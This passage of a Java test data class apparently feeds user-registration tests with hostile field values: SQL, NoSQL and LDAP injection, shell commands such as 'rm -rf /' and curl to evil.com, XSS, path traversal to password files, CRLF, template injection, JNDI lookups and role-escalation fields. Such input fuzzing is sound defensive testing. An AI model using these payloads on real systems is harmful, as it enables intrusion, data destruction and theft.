                new JSONObject().put("username", "0x27204f522031313d31202d2d").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith15@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "%27%20OR%201%3D1--").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith16@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "'; EXEC xp_cmdshell('whoami')--").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith17@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "johndoe18").put("lastName", "Smith'; DROP TABLE users--").put("firstName", "John' OR '1'='1").put("email", "john'--@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
        };
    }

    public String[] getUserWithNoSqlInjectionData() throws JSONException {
        return new String[] {
                new JSONObject()
                        .put("username", new JSONObject().put("$ne", JSONObject.NULL))
                        .put("lastName", "Smith").put("firstName", "John")
                        .put("email", "john.smith1@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject()
                        .put("username", new JSONObject().put("$gt", ""))
                        .put("lastName", "Smith").put("firstName", "John")
                        .put("email", "john.smith2@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject()
                        .put("username", new JSONObject().put("$regex", ".*"))
                        .put("lastName", "Smith").put("firstName", "John")
                        .put("email", "john.smith3@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject()
                        .put("username", new JSONObject().put("$where", "this.password == this.username"))
                        .put("lastName", "Smith").put("firstName", "John")
                        .put("email", "john.smith4@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject()
                        .put("username", "admin")
                        .put("lastName", "Smith").put("firstName", "John")
                        .put("email", "john.smith5@gmail.com")
                        .put("password", new JSONObject().put("$ne", JSONObject.NULL)).put("companyId", companyId).toString(),
                new JSONObject()
                        .put("username", new JSONObject().put("$exists", true))
                        .put("lastName", "Smith").put("firstName", "John")
                        .put("email", "john.smith6@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject()
                        .put("username", new JSONObject().put("$in",
                                new JSONArray().put("admin").put("root").put("administrator").put("superuser")))
                        .put("lastName", "Smith").put("firstName", "John")
                        .put("email", "john.smith7@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject()
                        .put("username", new JSONObject().put("$nin", new JSONArray().put("")))
                        .put("lastName", "Smith").put("firstName", "John")
                        .put("email", "john.smith8@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject()
                        .put("username", new JSONObject().put("$or", new JSONArray()
                                .put(new JSONObject().put("username", "admin"))
                                .put(new JSONObject().put("role", "ADMIN"))))
                        .put("lastName", "Smith").put("firstName", "John")
                        .put("email", "john.smith9@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject()
                        .put("username", new JSONObject().put("$function", new JSONObject()
                                .put("body", "function() { return true; }")
                                .put("args", new JSONArray())
                                .put("lang", "js")))
                        .put("lastName", "Smith").put("firstName", "John")
                        .put("email", "john.smith10@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject()
                        .put("username", new JSONObject().put("$expr", new JSONObject()
                                .put("$eq", new JSONArray().put("$username").put("$password"))))
                        .put("lastName", "Smith").put("firstName", "John")
                        .put("email", "john.smith11@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject()
                        .put("username", new JSONObject().put("$where", "sleep(5000) || true"))
                        .put("lastName", "Smith").put("firstName", "John")
                        .put("email", "john.smith12@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject()
                        .put("username", new JSONObject().put("$regex", "^(a+)+$"))
                        .put("lastName", "Smith").put("firstName", "John")
                        .put("email", "john.smith13@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject()
                        .put("username", new JSONObject().put("$type", 2))
                        .put("lastName", "Smith").put("firstName", "John")
                        .put("email", "john.smith14@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject()
                        .put("username", new JSONArray().put("admin").put("root"))
                        .put("lastName", "Smith").put("firstName", "John")
                        .put("email", "john.smith15@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject()
                        .put("username", new JSONObject().put("$regex", "^admin").put("$options", "i"))
                        .put("lastName", "Smith").put("firstName", "John")
                        .put("email", "john.smith16@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject()
                        .put("username", new JSONObject().put("$ne", JSONObject.NULL))
                        .put("lastName", "Smith").put("firstName", "John")
                        .put("email", new JSONObject().put("$regex", ".*"))
                        .put("password", new JSONObject().put("$ne", JSONObject.NULL)).put("companyId", companyId).toString(),
                new JSONObject()
                        .put("username", new JSONObject().put("$where", "while(true){}"))
                        .put("lastName", "Smith").put("firstName", "John")
                        .put("email", "john.smith18@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
        };
    }

    public String[] getUserWithLdapInjectionData() throws JSONException {
        return new String[] {
                new JSONObject().put("username", "*").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith1@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "*)(uid=*))(|(uid=*").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith2@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "admin)(&(password=*))").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith3@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "*)(|(objectClass=*").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith4@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "admin*").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith5@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "*admin").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith6@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "ad*min").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith7@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "admin\u0000").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith8@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "admin)(").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith9@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "admin\\2a").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith10@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "admin\\").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith11@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "admin,ou=admins,dc=example,dc=com").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith12@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "admin)(userPassword=a*").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith13@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "*)(!(uid=admin))").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith14@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "*)(|(cn=*)(cn=*").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith15@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "*)(memberOf=cn=admins,dc=example,dc=com").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith16@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "admin~=admin").put("lastName", "Smith").put("firstName", "John").put("email", "john.smith17@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
                new JSONObject().put("username", "johndoe18").put("lastName", "Smith)(uid=*").put("firstName", "John*").put("email", "*)(mail=*@gmail.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString(),
        };
    }

    public String[] getUserWithMaliciousData() throws JSONException {
        List<String> p = new ArrayList<>();

        // ============================================================
        // Scenario 14: Command / shell injection (payload in firstName)
        // ============================================================
        p.add(new JSONObject().put("username", "cmd1").put("lastName", "Smith").put("firstName", "John; ls -la").put("email", "cmd1@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "cmd2").put("lastName", "Smith").put("firstName", "John&& whoami").put("email", "cmd2@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "cmd3").put("lastName", "Smith").put("firstName", "John| cat /etc/passwd").put("email", "cmd3@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "cmd4").put("lastName", "Smith").put("firstName", "`whoami`").put("email", "cmd4@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "cmd5").put("lastName", "Smith").put("firstName", "$(whoami)").put("email", "cmd5@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "cmd6").put("lastName", "Smith").put("firstName", "$(curl http://evil.com/x)").put("email", "cmd6@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "cmd7").put("lastName", "Smith").put("firstName", "; rm -rf /").put("email", "cmd7@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "cmd8").put("lastName", "Smith").put("firstName", "John\nls -la").put("email", "cmd8@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "cmd9").put("lastName", "Smith").put("firstName", "%0als%20-la").put("email", "cmd9@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "cmd10").put("lastName", "Smith").put("firstName", "&ping -c 10 127.0.0.1&").put("email", "cmd10@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "cmd11").put("lastName", "Smith").put("firstName", "John;cat${IFS}/etc/passwd").put("email", "cmd11@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "cmd12").put("lastName", "Smith").put("firstName", "John<(curl evil.com)").put("email", "cmd12@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());

        // ============================================================
        // Scenario 15: XSS (payload in firstName)
        // ============================================================
        p.add(new JSONObject().put("username", "xss1").put("lastName", "Smith").put("firstName", "<script>alert(1)</script>").put("email", "xss1@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "xss2").put("lastName", "Smith").put("firstName", "<ScRiPt>alert(1)</ScRiPt>").put("email", "xss2@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "xss3").put("lastName", "Smith").put("firstName", "<script src=//evil.com/x.js></script>").put("email", "xss3@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "xss4").put("lastName", "Smith").put("firstName", "<img src=x onerror=alert(1)>").put("email", "xss4@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "xss5").put("lastName", "Smith").put("firstName", "<svg onload=alert(1)>").put("email", "xss5@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "xss6").put("lastName", "Smith").put("firstName", "<svg/onload=alert(1)>").put("email", "xss6@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "xss7").put("lastName", "Smith").put("firstName", "<body onload=alert(1)>").put("email", "xss7@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "xss8").put("lastName", "Smith").put("firstName", "<iframe src=javascript:alert(1)>").put("email", "xss8@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "xss9").put("lastName", "Smith").put("firstName", "<iframe srcdoc=\"<script>alert(1)</script>\">").put("email", "xss9@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "xss10").put("lastName", "Smith").put("firstName", "<a href=javascript:alert(1)>click</a>").put("email", "xss10@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "xss11").put("lastName", "Smith").put("firstName", "javascript:alert(1)").put("email", "xss11@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "xss12").put("lastName", "Smith").put("firstName", "<input autofocus onfocus=alert(1)>").put("email", "xss12@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "xss13").put("lastName", "Smith").put("firstName", "<select autofocus onfocus=alert(1)>").put("email", "xss13@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "xss14").put("lastName", "Smith").put("firstName", "<textarea autofocus onfocus=alert(1)>").put("email", "xss14@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "xss15").put("lastName", "Smith").put("firstName", "<keygen autofocus onfocus=alert(1)>").put("email", "xss15@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "xss16").put("lastName", "Smith").put("firstName", "<video><source onerror=alert(1)>").put("email", "xss16@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "xss17").put("lastName", "Smith").put("firstName", "<audio src=x onerror=alert(1)>").put("email", "xss17@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "xss18").put("lastName", "Smith").put("firstName", "<details open ontoggle=alert(1)>").put("email", "xss18@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "xss19").put("lastName", "Smith").put("firstName", "<marquee onstart=alert(1)>").put("email", "xss19@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "xss20").put("lastName", "Smith").put("firstName", "\"><script>alert(1)</script>").put("email", "xss20@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "xss21").put("lastName", "Smith").put("firstName", "'><script>alert(1)</script>").put("email", "xss21@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "xss22").put("lastName", "Smith").put("firstName", "</title><script>alert(1)</script>").put("email", "xss22@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "xss23").put("lastName", "Smith").put("firstName", "</textarea><script>alert(1)</script>").put("email", "xss23@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "xss24").put("lastName", "Smith").put("firstName", "&#60;script&#62;alert(1)&#60;/script&#62;").put("email", "xss24@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "xss25").put("lastName", "Smith").put("firstName", "%3Cscript%3Ealert(1)%3C%2Fscript%3E").put("email", "xss25@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "xss26").put("lastName", "Smith").put("firstName", "jaVaScRiPt:alert(1)").put("email", "xss26@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "xss27").put("lastName", "Smith").put("firstName", "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==").put("email", "xss27@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "xss28").put("lastName", "Smith").put("firstName", "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!><sVg/<sVg/oNloAd=alert()//>").put("email", "xss28@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "xss29").put("lastName", "Smith").put("firstName", "<script>alert('stored-probe')</script>").put("email", "xss29@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());

        // ============================================================
        // Scenario 16: Path traversal (payload in firstName)
        // ============================================================
        p.add(new JSONObject().put("username", "pt1").put("lastName", "Smith").put("firstName", "../../../etc/passwd").put("email", "pt1@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "pt2").put("lastName", "Smith").put("firstName", "..\\..\\..\\windows\\system32\\config\\sam").put("email", "pt2@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "pt3").put("lastName", "Smith").put("firstName", "....//....//....//etc/passwd").put("email", "pt3@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "pt4").put("lastName", "Smith").put("firstName", "..%2f..%2f..%2fetc%2fpasswd").put("email", "pt4@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "pt5").put("lastName", "Smith").put("firstName", "..%252f..%252f..%252fetc%252fpasswd").put("email", "pt5@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "pt6").put("lastName", "Smith").put("firstName", "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd").put("email", "pt6@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "pt7").put("lastName", "Smith").put("firstName", "/etc/passwd%00.png").put("email", "pt7@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "pt8").put("lastName", "Smith").put("firstName", "file:///etc/passwd").put("email", "pt8@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "pt9").put("lastName", "Smith").put("firstName", "file:///c:/windows/win.ini").put("email", "pt9@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "pt10").put("lastName", "Smith").put("firstName", "\\\\evil.com\\share\\file").put("email", "pt10@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "pt11").put("lastName", "Smith").put("firstName", "C:\\Windows\\System32\\drivers\\etc\\hosts").put("email", "pt11@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());

        // ============================================================
        // Scenario 17: Unicode / encoding attacks (payload in username)
        // ============================================================
        p.add(new JSONObject().put("username", "\u202Eadmin").put("lastName", "Smith").put("firstName", "John").put("email", "uni1@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "\u0430dmin").put("lastName", "Smith").put("firstName", "John").put("email", "uni2@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "admin\u200B").put("lastName", "Smith").put("firstName", "John").put("email", "uni3@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "\uFEFFadmin").put("lastName", "Smith").put("firstName", "John").put("email", "uni4@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "ad\u0000min").put("lastName", "Smith").put("firstName", "John").put("email", "uni5@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "\u212Bngstrom").put("lastName", "Smith").put("firstName", "John").put("email", "uni7@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "user\uD83D\uDC68\u200D\uD83D\uDC69\u200D\uD83D\uDC67").put("lastName", "Smith").put("firstName", "John").put("email", "uni8@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "admin\uD800").put("lastName", "Smith").put("firstName", "John").put("email", "uni9@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "\u202Aadmin\u202C").put("lastName", "Smith").put("firstName", "John").put("email", "uni10@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());

        // ============================================================
        // Scenario 18: CRLF / header / log injection
        // ============================================================
        p.add(new JSONObject().put("username", "alice\r\nSet-Cookie: admin=true").put("lastName", "Smith").put("firstName", "John").put("email", "crlf1@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "alice\nLocation: http://evil.com").put("lastName", "Smith").put("firstName", "John").put("email", "crlf2@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "alice%0d%0aSet-Cookie:%20admin=true").put("lastName", "Smith").put("firstName", "John").put("email", "crlf3@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "crlf4").put("lastName", "Smith").put("firstName", "John\n[INFO] User admin logged in").put("email", "crlf4@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());

        // ============================================================
        // Scenario 19: Format-string payloads
        // ============================================================
        p.add(new JSONObject().put("username", "fmt1").put("lastName", "Smith").put("firstName", "%s%s%s%s%s%s").put("email", "fmt1@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "fmt2").put("lastName", "%n%n%n%n%n").put("firstName", "John").put("email", "fmt2@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "fmt3").put("lastName", "Smith").put("firstName", "%x.%x.%x.%x").put("email", "fmt3@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "fmt4").put("lastName", "Smith").put("firstName", "John").put("email", "fmt4@example.com").put("password", "%08x.%08x.%08x.%08x").put("companyId", companyId).toString());

        // ============================================================
        // Scenario 20: Template / SSTI / EL / JNDI (payload in firstName)
        // ============================================================
        p.add(new JSONObject().put("username", "tpl1").put("lastName", "Smith").put("firstName", "${7*7}").put("email", "tpl1@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "tpl2").put("lastName", "Smith").put("firstName", "{{7*7}}").put("email", "tpl2@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "tpl3").put("lastName", "Smith").put("firstName", "<%= 7*7 %>").put("email", "tpl3@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "tpl4").put("lastName", "Smith").put("firstName", "#{7*7}").put("email", "tpl4@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "tpl5").put("lastName", "Smith").put("firstName", "#{T(java.lang.Runtime).getRuntime().exec('whoami')}").put("email", "tpl5@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "tpl6").put("lastName", "Smith").put("firstName", "${jndi:ldap://evil.com/a}").put("email", "tpl6@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "tpl7").put("lastName", "Smith").put("firstName", "${jndi:rmi://evil.com/a}").put("email", "tpl7@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "tpl8").put("lastName", "Smith").put("firstName", "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}").put("email", "tpl8@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "tpl9").put("lastName", "Smith").put("firstName", "{{config.items()}}").put("email", "tpl9@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "tpl10").put("lastName", "Smith").put("firstName", "{{''.__class__.__mro__[1].__subclasses__()}}").put("email", "tpl10@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "tpl11").put("lastName", "Smith").put("firstName", "#set($x='') $x.getClass().forName('java.lang.Runtime')").put("email", "tpl11@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "tpl12").put("lastName", "Smith").put("firstName", "<#assign x=\"freemarker.template.utility.Execute\"?new()>${x(\"id\")}").put("email", "tpl12@example.com").put("password", "grgrbtrhrebwhnrwtn").put("companyId", companyId).toString());

        // ============================================================
        // Scenario 21: Mass-assignment / role-escalation
        // ============================================================
        p.add(new JSONObject().put("username", "ma1").put("lastName", "Smith").put("firstName", "John").put("email", "ma1@example.com").put("password", "grgrbtrhrebwhnrwtn").put("role", "ADMIN").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "ma2").put("lastName", "Smith").put("firstName", "John").put("email", "ma2@example.com").put("password", "grgrbtrhrebwhnrwtn").put("isAdmin", true).put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "ma3").put("lastName", "Smith").put("firstName", "John").put("email", "ma3@example.com").put("password", "grgrbtrhrebwhnrwtn").put("admin", 1).put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "ma4").put("lastName", "Smith").put("firstName", "John").put("email", "ma4@example.com").put("password", "grgrbtrhrebwhnrwtn").put("authorities", new JSONArray().put("ROLE_ADMIN").put("ROLE_SUPERUSER")).put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "ma5").put("lastName", "Smith").put("firstName", "John").put("email", "ma5@example.com").put("password", "grgrbtrhrebwhnrwtn").put("permissions", new JSONArray().put("*")).put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "ma6").put("lastName", "Smith").put("firstName", "John").put("email", "ma6@example.com").put("password", "grgrbtrhrebwhnrwtn").put("verified", true).put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "ma7").put("lastName", "Smith").put("firstName", "John").put("email", "ma7@example.com").put("password", "grgrbtrhrebwhnrwtn").put("emailVerified", true).put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "ma8").put("lastName", "Smith").put("firstName", "John").put("email", "ma8@example.com").put("password", "grgrbtrhrebwhnrwtn").put("active", true).put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "ma9").put("lastName", "Smith").put("firstName", "John").put("email", "ma9@example.com").put("password", "grgrbtrhrebwhnrwtn").put("enabled", true).put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "ma10").put("lastName", "Smith").put("firstName", "John").put("email", "ma10@example.com").put("password", "grgrbtrhrebwhnrwtn").put("locked", false).put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "ma11").put("lastName", "Smith").put("firstName", "John").put("email", "ma11@example.com").put("password", "grgrbtrhrebwhnrwtn").put("id", 1).put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "ma12").put("lastName", "Smith").put("firstName", "John").put("email", "ma12@example.com").put("password", "grgrbtrhrebwhnrwtn").put("userId", 1).put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "ma13").put("lastName", "Smith").put("firstName", "John").put("email", "ma13@example.com").put("password", "grgrbtrhrebwhnrwtn").put("createdAt", "1970-01-01T00:00:00Z").put("companyId", companyId).toString());
        p.add(new JSONObject().put("username", "ma14").put("lastName", "Smith").put("firstName", "John").put("email", "ma14@example.com").put("password", "grgrbtrhrebwhnrwtn").put("password_hash", "$2a$10$abcdefghijklmnopqrstuv").put("companyId", companyId).toString());
